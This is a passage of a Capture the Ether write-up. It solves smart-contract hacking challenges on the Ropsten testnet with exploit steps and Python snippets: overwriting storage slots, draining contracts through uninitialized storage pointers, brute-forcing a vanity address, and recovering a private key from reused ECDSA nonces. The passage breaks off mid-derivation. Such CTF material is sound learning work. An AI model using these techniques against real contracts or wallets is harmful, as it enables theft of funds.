+<p><span class="katex--display"><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mn>0</mn><mi>x</mi><mn>4</mn><mi>e</mi><mi>f</mi><mn>1</mn><mi>d</mi><mn>2</mn><mi>a</mi><mi>d</mi><mn>89</mn><mi>e</mi><mi>d</mi><mi>f</mi><mn>8</mn><mi>c</mi><mn>4</mn><mi>d</mi><mn>91132028</mn><mi>e</mi><mn>8195</mn><mi>c</mi><mi>d</mi><mi>f</mi><mn>30</mn><mi>b</mi><mi>b</mi><mn>4</mn><mi>b</mi><mn>5053</mn><mi>d</mi><mn>4</mn><mi>f</mi><mn>8</mn><mi>c</mi><mi>d</mi><mn>260341</mn><mi>d</mi><mn>4805</mn><mi>f</mi><mn>30</mn><mi>a</mi></mrow><annotation encoding="application/x-tex">0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.88888em; vertical-align: -0.19444em;"></span><span class="mord">0</span><span class="mord mathnormal">x</span><span class="mord">4</span><span class="mord mathnormal">e</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord">1</span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mord mathnormal">a</span><span class="mord mathnormal">d</span><span class="mord">89</span><span class="mord mathnormal">e</span><span style="margin-right: 0.10764em;" class="mord mathnormal">df</span><span class="mord">8</span><span class="mord mathnormal">c</span><span class="mord">4</span><span class="mord mathnormal">d</span><span class="mord">91132028</span><span class="mord mathnormal">e</span><span class="mord">8195</span><span class="mord mathnormal">c</span><span style="margin-right: 0.10764em;" class="mord mathnormal">df</span><span class="mord">30</span><span class="mord mathnormal">bb</span><span class="mord">4</span><span class="mord mathnormal">b</span><span class="mord">5053</span><span class="mord mathnormal">d</span><span class="mord">4</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord">8</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mord">260341</span><span class="mord mathnormal">d</span><span class="mord">4805</span><span style="margin-right: 0.10764em;" class="mord mathnormal">f</span><span class="mord">30</span><span class="mord mathnormal">a</span></span></span></span></span></span></p>
+<p>With this value we can now call <code>set()</code> with <code>key = 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a</code> and with <code>value = 1</code>. Which overwrites the <code>0x0000000000000000000000000000000000000000000000000000000000000000</code> that is held in this memory slot representing the value of <code>isComplete</code> with <code>0x0000000000000000000000000000000000000000000000000000000000000001</code> which as a <code>bool</code> represents the value <code>true</code>.</p>
+<p>Therefore, when we call the getter <code>isComplete()</code> for this state variable (since it’s a public variable), we get <code>true</code> and the challenge is complete.</p>
+<h4 id="submission-transaction-11">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0x9e77f98e6cf3eba43ed8d4ce2f176d9c25e7f0116d2a7b2e0a51fbfb058eba52">https://ropsten.etherscan.io/tx/0x9e77f98e6cf3eba43ed8d4ce2f176d9c25e7f0116d2a7b2e0a51fbfb058eba52</a></p>
+<hr>
+<h3 id="donation">Donation</h3>
+<h4 id="objectives-12">Objectives</h4>
+<blockquote>
+<p>A candidate you don’t like is accepting campaign contributions via the smart contract below.<br>
+To complete this challenge, steal the candidate’s ether.</p>
+</blockquote>
+<h4 id="solution-12">Solution</h4>
+<p>The function <code>donate()</code> contains a bug:</p>
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">donate</span><span class="token punctuation">(</span>uint256 etherAmount<span class="token punctuation">)</span> <span class="token keyword">public</span> payable <span class="token punctuation">{</span>
+    <span class="token comment">// amount is in ether, but msg.value is in wei</span>
+    uint256 scale <span class="token operator">=</span> <span class="token number">10</span><span class="token operator">**</span><span class="token number">18</span> <span class="token operator">*</span> <span class="token number">1</span> ether<span class="token punctuation">;</span>
+    <span class="token function">require</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>value <span class="token operator">==</span> etherAmount <span class="token operator">/</span> scale<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+    Donation donation<span class="token punctuation">;</span>
+    donation<span class="token punctuation">.</span>timestamp <span class="token operator">=</span> now<span class="token punctuation">;</span>
+    donation<span class="token punctuation">.</span>etherAmount <span class="token operator">=</span> etherAmount<span class="token punctuation">;</span>
+
+    donations<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>donation<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>The variable <code>donation</code> is not initialized, so it is defaulted to storage. As a result, <code>donation</code> now is a pointer that affects storage slot 0 (<code>donations</code>) and storage slot 1 (<code>owner</code>). As a result, whatever value is assigned to these two variables, but in particular, to <code>etherAmount</code>, will write to those two storage slots.</p>
+<pre class=" language-js"><code class="prism  language-js">donation<span class="token punctuation">.</span>timestamp <span class="token operator">=</span> now<span class="token punctuation">;</span>
+donation<span class="token punctuation">.</span>etherAmount <span class="token operator">=</span> etherAmount<span class="token punctuation">;</span>
+</code></pre>
+<p>To complete the challenge, all you have to do is pass the uint conversion of your address divided by <code>scale</code> as <code>etherAmount</code>, after this, you can call <code>withdraw()</code> and drain the contract.</p>
+<p>In Python I did it as follows:</p>
+<pre class=" language-python"><code class="prism  language-python">donation<span class="token punctuation">.</span>donate<span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">,</span> _from <span class="token operator">|</span> <span class="token punctuation">{</span><span class="token string">'value'</span><span class="token punctuation">:</span>floor<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>acc<span class="token punctuation">.</span>address<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">1e36</span><span class="token punctuation">)</span><span class="token punctuation">}</span><span class="token punctuation">)</span>
+</code></pre>
+<p>Where:</p>
+<ul>
+<li><code>_from</code> is {‘from’:acc.address}</li>
+<li><code>acc</code> is my loaded account through my private key (the account doing the capture the ether challenges)</li>
+<li><code>floor()</code> is the floor function</li>
+<li><code>//</code> is integer division</li>
+<li><code>int(acc.address, 16)</code> is the conversion to int of my address (basically hexadecimal <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo>→</mo></mrow><annotation encoding="application/x-tex">\rightarrow</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.36687em; vertical-align: 0em;"></span><span class="mrel">→</span></span></span></span></span> decimal)</li>
+</ul>
+<h4 id="submission-transaction-12">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0x5fc76f733f3384fa064f8d10acda683ca35cd683dc47781aa2e9d5ef9913f5b8">https://ropsten.etherscan.io/tx/0x5fc76f733f3384fa064f8d10acda683ca35cd683dc47781aa2e9d5ef9913f5b8</a></p>
+<hr>
+<h3 id="fifty-years">Fifty years</h3>
+<h4 id="objectives-13">Objectives</h4>
+<blockquote>
+<p>This contract locks away ether. The initial ether is locked away until 50 years has passed, and subsequent contributions are locked until even later.<br>
+All you have to do to complete this challenge is wait 50 years and withdraw the ether. If you’re not that patient, you’ll need to combine several techniques to hack this contract.</p>
+</blockquote>
+<h4 id="solution-13">Solution</h4>
+<p>Theres some exploitable mistakes in <code>upsert()</code>. We can solve this challenge as follows:</p>
+<ol>
+<li>Call <code>upsert()</code> with:
+<ul>
+<li><code>index</code> as a value larger than 0 (length of <code>queue</code>), in my case I used 1, this would send us to the else block of that if statement.</li>
+<li><code>timestamp</code> as the largest uint256 minus the seconds in a day (86400). We know block timestamps are set in unix time, which is measured in seconds, and that the require statement in the else block checks that the timestamp we input is larger than the timestamp of the previous element to the one we add + one day (86400 seconds).</li>
+<li>Sending exactly 1 wei, which makes <code>queue.length = 1</code>, we need this to be able to add an additional element to <code>queue</code>.</li>
+</ul>
+</li>
+</ol>
+<p>Calling <code>upsert()</code> with these parameters will cause the code in the <code>else</code> block to run, which never initializes <code>contribution</code>. Therefore, we would be overwriting:</p>
+<ul>
+<li>The contents of <code>queue</code>'s length, because the length of a dynamically-sized array is the first property of it that’s stored in a contract’s storage.</li>
+<li>The contents of <code>head</code> with the value of this block timestamp. This is not particularly relevant because we will then overwrite the contents of <code>head</code> again, but it’s important to mention that it will also do this.</li>
+</ul>
+<ol start="2">
+<li>Call <code>upsert()</code> again with:
+<ul>
+<li><code>index</code> as 1, which would still go to the else block</li>
+<li><code>timestamp</code> as 0. in this case we want to overwrite the value of <code>head</code> with 0, since we made it <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>256</mn></msup><mo>−</mo><mn>86400</mn></mrow><annotation encoding="application/x-tex">2^{256} - 86400</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.897438em; vertical-align: -0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">256</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">86400</span></span></span></span></span> before and this would not allow us to call <code>withdraw()</code>, because the current <code>block.timestamp</code> would be much smaller than <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mn>2</mn><mn>256</mn></msup><mo>−</mo><mn>86400</mn></mrow><annotation encoding="application/x-tex">2^{256} - 86400</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.897438em; vertical-align: -0.08333em;"></span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.814108em;"><span class="" style="top: -3.063em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">256</span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">86400</span></span></span></span></span></li>
+<li>Sending exactly 1 wei, as we want to retain the length of <code>queue</code>.</li>
+</ul>
+</li>
+</ol>
+<p>In this case, we now have <code>head</code> as 0, which allows us to call <code>withdraw()</code> and also include the first contract deposit in the withdrawal amount, which is the first element of the <code>queue</code> array.</p>
+<ol start="3">
+<li>Call <code>withdraw()</code> with <code>index = 1</code>. We now can call <code>withdraw()</code> because the timestamp in the second struct of the array is 0, which is always lower than <code>block.timestamp</code> and because <code>head</code> is still 0, it’ll allow us to withdraw the full contract balance.</li>
+</ol>
+<h4 id="submission-transaction-13">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0xce1ed34369e62875cbab92681c06960b8edbd8b2cc6b71da2eca5c617559e7bf">https://ropsten.etherscan.io/tx/0xce1ed34369e62875cbab92681c06960b8edbd8b2cc6b71da2eca5c617559e7bf</a></p>
+<hr>
+<h2 id="accounts">Accounts</h2>
+<h3 id="fuzzy-identity">Fuzzy identity</h3>
+<h4 id="objectives-14">Objectives</h4>
+<blockquote>
+<p>This contract can only be used by me (smarx). I don’t trust myself to remember my private key, so I’ve made it so whatever address I’m using in the future will work:</p>
+<ol>
+<li>I always use a wallet contract that returns “smarx” if you ask its name.</li>
+<li>Everything I write has bad code in it, so my address always includes the hex string badc0de.</li>
+</ol>
+<p>To complete this challenge, steal my identity!</p>
+</blockquote>
+<h4 id="solution-14">Solution</h4>
+<p>There’s two conditions we need to satisfy to successfully pass the two require statements in <code>authenticate()</code>:</p>
+<ol>
+<li>When we call the <code>authenticate()</code> function from a contract, there must be a <code>name()</code> function defined in the calling contract that returns “smarx”, I defined it as follows:</li>
+</ol>
+<pre class=" language-js"><code class="prism  language-js"><span class="token keyword">function</span> <span class="token function">name</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">public</span> view <span class="token function">returns</span> <span class="token punctuation">(</span>bytes32<span class="token punctuation">)</span> <span class="token punctuation">{</span>
+    <span class="token keyword">return</span> <span class="token function">bytes32</span><span class="token punctuation">(</span><span class="token string">"smarx"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<ol start="2">
+<li>We need that our contract address has the particular property that when it is operated with the <code>mask</code> as defined in <code>isBadCode</code> using a bitwise and (<code>&amp;</code>) that its returning value is the value of <code>id</code>, which is any hex with <code>badc0de</code> in it, in any position.</li>
+</ol>
+<p>This last particular quality is especially difficult to attain (at least compared to the first one). The reason for this is that we need to bruteforce the address of this to-be-deployed contract that we will use to interact with the FuzzyIdentityChallenge contract.</p>
+<p>Given that contract addresses are deterministic and computed using the deployer’s address and the nonce in which the contract wil be deployed, we can generate lots of different contract addresses in three ways in order to bruteforce it:</p>
+<ol>
+<li>
+<p>Utilizing one address and increasing the nonce by one until we find it</p>
+</li>
+<li>
+<p>Utilizing many addresses and the nonce 0, meaning that the first transaction each address makes will be the attacker contract deployment</p>
+</li>
+<li>
+<p>Mixing 1 and 2 by creating many addresses and testing each address up to a specific nonce</p>
+</li>
+</ol>
+<p>No matter the approach, we then have to bruteforce one address+nonce combination for which the condition in <code>isBadCode()</code> is met.</p>
+<p>This takes a <em>long</em> time. There probability that the string <code>badc0de</code> appears written exactly like that is of <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mrow><mn>1</mn><msup><mn>6</mn><mn>7</mn></msup></mrow></mfrac><mo>≈</mo><mn>0.000000004</mn></mrow><annotation encoding="application/x-tex">\frac{1}{16^{7}} \approx 0.000000004</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1.19011em; vertical-align: -0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.845108em;"><span class="" style="top: -2.655em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight"><span class="mord mtight">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.746314em;"><span class="" style="top: -2.786em; margin-right: 0.0714286em;"><span class="pstrut" style="height: 2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.394em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.345em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">0.000000004</span></span></span></span></span>, which is slightly alleviated by the fact that we can have it in 34 different positions, which increases the probability significantly (<span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mfrac><mn>1</mn><mrow><mn>1</mn><msup><mn>6</mn><mn>7</mn></msup></mrow></mfrac><mo>∗</mo><mn>34</mn><mo>≈</mo><mn>0.000000136</mn></mrow><annotation encoding="application/x-tex">\frac{1}{16^{7}} * 34 \approx 0.000000136</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 1.19011em; vertical-align: -0.345em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.845108em;"><span class="" style="top: -2.655em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight"><span class="mord mtight">6</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height: 0.746314em;"><span class="" style="top: -2.786em; margin-right: 0.0714286em;"><span class="pstrut" style="height: 2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight"><span class="mord mtight">7</span></span></span></span></span></span></span></span></span></span></span></span><span class="" style="top: -3.23em;"><span class="pstrut" style="height: 3em;"></span><span class="frac-line" style="border-bottom-width: 0.04em;"></span></span><span class="" style="top: -3.394em;"><span class="pstrut" style="height: 3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.345em;"><span class=""></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mspace" style="margin-right: 0.222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right: 0.222222em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">34</span><span class="mspace" style="margin-right: 0.277778em;"></span><span class="mrel">≈</span><span class="mspace" style="margin-right: 0.277778em;"></span></span><span class="base"><span class="strut" style="height: 0.64444em; vertical-align: 0em;"></span><span class="mord">0.000000136</span></span></span></span></span>, but this still requires millions of tries.</p>
+<p>It certainly does not particularly help that I chose python to do this, as python is notoriously slow, this would’ve been much faster to run in a compiled, low-level programming language, albeit much more time consuming to code.</p>
+<p>Once the account+nonce is found, all we have to do is run <code>authenticate()</code> from a contract deployed by this account at the nonce we found.</p>
+<h4 id="my-bruteforce-result">My bruteforce result</h4>
+<p>The mnemonic I was able to find with my bruteforce is:</p>
+<pre><code>faint casino always journey city view glue drum elephant weather during maple
+</code></pre>
+<p>Which generates the address <code>0xB4Fb8ba4EEf20F2F64E0082a302FE3291C33F0ac</code> at offset 765.</p>
+<p>This address will deploy (now has already deployed) at nonce 0 the contract <code>0xe8e503a2294ac68e0f9f52e2badc0de90c6e2142</code> which contains the <code>badc0de</code> string.</p>
+<h4 id="submission-transaction-14">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0x01bbd72aa9f8332658164820b190430404eb1dc956dd53fb26b21d3a9b2fafdf">https://ropsten.etherscan.io/tx/0x01bbd72aa9f8332658164820b190430404eb1dc956dd53fb26b21d3a9b2fafdf</a></p>
+<hr>
+<h3 id="public-key">Public key</h3>
+<h4 id="objectives-15">Objectives</h4>
+<blockquote>
+<p>Recall that an address is the last 20 bytes of the keccak-256 hash of the address’s public key.<br>
+To complete this challenge, find the public key for the owner’s account.</p>
+</blockquote>
+<h4 id="solution-15">Solution</h4>
+<p>The public key associated with an address can be derived from a transaction signature. In this case, the account’s public key we need can indeed be derives as the account has made at least <em>one</em> transaction.</p>
+<p>The transaction in question has the following hash: <a href="https://ropsten.etherscan.io/tx/0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb"><code>0xabc467bedd1d17462fcc7942d0af7874d6f8bdefee2b299c9168a216d3ff0edb</code></a>.</p>
+<p>This transaction is the <em>only</em> transaction that this account has signed, but because it was signed by this address and it’s an <em>outgoing</em> transaction, we can derive the public key from this specific transaction’s <code>v</code>, <code>r</code> and <code>s</code>.</p>
+<p>This is detailed in <a href="https://ethereum.github.io/yellowpaper/paper.pdf#subsection.4.2">Appendix F of the ethereum yellowpaper</a>, where the methodology of generating transaction signatures is defined.</p>
+<p>Putting these three values together we can reconstruct the signature and recover the public key from the message hash. Which turns out to be:</p>
+<pre><code>0x613a8d23bd34f7e568ef4eb1f68058e77620e40079e88f705dfb258d7a06a1a0364dbe56cab53faf26137bec044efd0b07eec8703ba4a31c588d9d94c35c8db4
+</code></pre>
+<h4 id="submission-transaction-15">Submission transaction</h4>
+<p><a href="https://ropsten.etherscan.io/tx/0xce1ed34369e62875cbab92681c06960b8edbd8b2cc6b71da2eca5c617559e7bf">https://ropsten.etherscan.io/tx/0xce1ed34369e62875cbab92681c06960b8edbd8b2cc6b71da2eca5c617559e7bf</a></p>
+<hr>
+<h3 id="account-takeover">Account takeover</h3>
+<h4 id="objectives-16">Objectives</h4>
+<blockquote>
+<p>To complete this challenge, send a transaction from the owner’s account.</p>
+</blockquote>
+<h4 id="solution-16">Solution</h4>
+<p>An Ethereum transaction is composed of several different things. In particular, transactions prior to EIP-1559, have the following parameters:</p>
+<pre class=" language-json"><code class="prism  language-json"><span class="token punctuation">{</span>
+    <span class="token string">"nonce"</span><span class="token punctuation">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
+    <span class="token string">"gasPrice"</span><span class="token punctuation">:</span> <span class="token number">1000000000</span><span class="token punctuation">,</span>
+    <span class="token string">"gasLimit"</span><span class="token punctuation">:</span> <span class="token number">21000</span><span class="token punctuation">,</span>
+    <span class="token string">"to"</span><span class="token punctuation">:</span> <span class="token string">"0x92b28647Ae1F3264661f72fb2eB9625A89D88A31"</span><span class="token punctuation">,</span>
+    <span class="token string">"value"</span><span class="token punctuation">:</span> <span class="token number">1230000000000000000</span><span class="token punctuation">,</span>
+    <span class="token string">"data"</span><span class="token punctuation">:</span> <span class="token string">"0x"</span><span class="token punctuation">,</span>
+    <span class="token string">"v"</span><span class="token punctuation">:</span> <span class="token number">41</span><span class="token punctuation">,</span>
+    <span class="token string">"r"</span><span class="token punctuation">:</span> <span class="token string">"0x69a726edfb4b802cbf267d5fd1dabcea39d3d7b4bf62b9eeaeba387606167166"</span><span class="token punctuation">,</span>
+    <span class="token string">"s"</span><span class="token punctuation">:</span> <span class="token string">"0x7724cedeb923f374bef4e05c97426a918123cc4fec7b07903839f12517e1b3c8"</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>The Keccak256 hash of the RLP encoding of the concatenation of these values is this transaction’s hash (its unique identifier).</p>
+<p>In particular, the parameters <code>v</code>, <code>r</code> and <code>s</code> are used to sign Ethereum transactions using the private key of the sender of this transaction. Ethereum transaction signatures use a specification of ECDSA defined in <a href="https://ethereum.github.io/yellowpaper/paper.pdf#appendix.F">Appendix F of the Ethereum yellowpaper</a>.</p>
+<p>According to ECDSA, the value of <code>k</code> (<strong>I will refer to it as <code>r</code></strong> given that this is the letter used to refer to <code>k</code> in Ethereum) has to be a cryptografically secure random integer. This integer has to <em>necessarily</em> be chosen in a cryptografically secure random way, it should <em>never</em> be the same for two transactions and it should also never be predictable (if tx A uses <code>r</code>, tx B should <em>not</em> use something like <code>r+1</code>).</p>
+<p>In this challenge, the address in question (<code>0x6B477781b0e68031109f21887e6B5afEAaEB002b</code>), specified in the <code>owner</code> state variable of the challenge contract, has used <code>r</code> in two distinct transactions. As a result of this repeated use of <code>r</code>, we can actually derive the private key of this address (more on why this is possible in <a href="https://en.wikipedia.org/wiki/Elliptic_Curve_Digital_Signature_Algorithm#Signature_generation_algorithm">this excellent wikipedia article</a>) solving a simple system of equations.</p>
+<p>To solve the system of equations, we need to first gather some information from these transactions. This <em>should</em> be trivial, but Ethereum has changed quite significantly since the creation of this challenge, so obtaining some of the information required to solve the system of equations is certainly, in my opinion, not the easiest task in the universe, but it’s possible.</p>
+<h4 id="parameters-required">Parameters required</h4>
+<h5 id="r"><code>r</code></h5>
+<ul>
+<li><code>r</code>: We need to get the repeated <code>r</code> value used for both transactions. This is relatively easy, all you need to do is pull <em>all</em> the transactions the address has made and look for the ones that have the same <code>r</code>. I did this by pulling all the data for this address from the Etherscan API:</li>
+</ul>
+<pre class=" language-python"><code class="prism  language-python">txs <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>f<span class="token string">'https://api-ropsten.etherscan.io/api?module=account&amp;action=txlist&amp;address=0x6b477781b0e68031109f21887e6b5afeaaeb002b&amp;startblock=0&amp;endblock=99999999&amp;page=1&amp;offset=269&amp;sort=asc&amp;apikey={os.environ["ETHERSCAN_API_KEY"]}'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>After this, I gathered all the hashes for all the transactions and loaded them into python using <a href="http://web3.py">web3.py</a>:</p>
+<pre class=" language-python"><code class="prism  language-python">txs <span class="token operator">=</span> <span class="token punctuation">[</span>web3<span class="token punctuation">.</span>eth<span class="token punctuation">.</span>get_transaction<span class="token punctuation">(</span>tx<span class="token punctuation">[</span><span class="token string">'hash'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> tx <span class="token keyword">in</span> txs<span class="token punctuation">[</span><span class="token string">'result'</span><span class="token punctuation">]</span><span class="token punctuation">]</span>
+</code></pre>
+<p>I then used <code>Counter</code> from the awesome <code>collections</code> library to count all the <code>r</code> values and see which is the repeated one:</p>
+<pre class=" language-python"><code class="prism  language-python">repeated_r <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token punctuation">{</span>v<span class="token punctuation">:</span>k <span class="token keyword">for</span> k<span class="token punctuation">,</span>v <span class="token keyword">in</span> Counter<span class="token punctuation">(</span><span class="token punctuation">[</span>tx<span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">for</span> tx <span class="token keyword">in</span> txs<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">.</span>items<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">if</span> v <span class="token operator">&gt;</span> <span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">.</span>values<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
+</code></pre>
+<p>And then identified which were the transactions that had this <code>r</code> value, and they turn out to be the first and second transactions the address has made:</p>
+<pre class=" language-python"><code class="prism  language-python">txs_with_repeated_r <span class="token operator">=</span> <span class="token punctuation">[</span>tx <span class="token keyword">for</span> tx <span class="token keyword">in</span> txs <span class="token keyword">if</span> tx<span class="token punctuation">[</span><span class="token string">'r'</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> repeated_r<span class="token punctuation">]</span>
+</code></pre>
+<p>Now that we have identified the transactions and acquired the <code>r</code>, we can now continue gathering what we need to derive the private key. For later, let’s call this value <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>r</mi></mrow><annotation encoding="application/x-tex">r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.43056em; vertical-align: 0em;"></span><span style="margin-right: 0.02778em;" class="mord mathnormal">r</span></span></span></span></span>.</p>
+<h5 id="s"><code>s</code></h5>
+<ul>
+<li><code>s</code>: This is trivial, we have the transaction objects and all we need to get is the <code>s</code> for <em>both</em> transactions, we can call these <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">s_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span> (for the first tx) and <span class="katex--inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">s_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height: 0.58056em; vertical-align: -0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height: 0.301108em;"><span class="" style="top: -2.55em; margin-left: 0em; margin-right: 0.05em;"><span class="pstrut" style="height: 2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height: 0.15em;"><span class=""></span></span></span></span></span></span></span></span></span></span> (for the second tx). To get them in python, I did this:</li>
+</ul>
